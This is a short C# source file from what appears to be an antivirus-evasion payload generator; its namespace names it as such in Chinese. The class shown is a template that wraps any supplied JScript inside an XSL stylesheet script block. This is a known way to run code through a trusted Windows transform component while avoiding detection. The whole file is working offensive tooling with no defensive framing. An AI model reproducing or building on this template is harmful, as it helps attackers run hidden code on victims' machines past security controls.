using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace 掩日___免杀执行器生成工具
{
    class TP_XSL
    {
        string code;

        public TP_XSL()
        {
            code = @"<?xml version='1.0'?>
<stylesheet
xmlns=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt""
xmlns:user=""placeholder""
version=""1.0"">
<output method=""text""/>
	<ms:script implements-prefix=""user"" language=""JScript"">
	<![CDATA[
%JS_HERE%
	]]> </ms:script>
</stylesheet>";
        }

        public String GetCode(string js_result)
        {
            return code.Replace("%JS_HERE%", js_result);
        }
    }
}
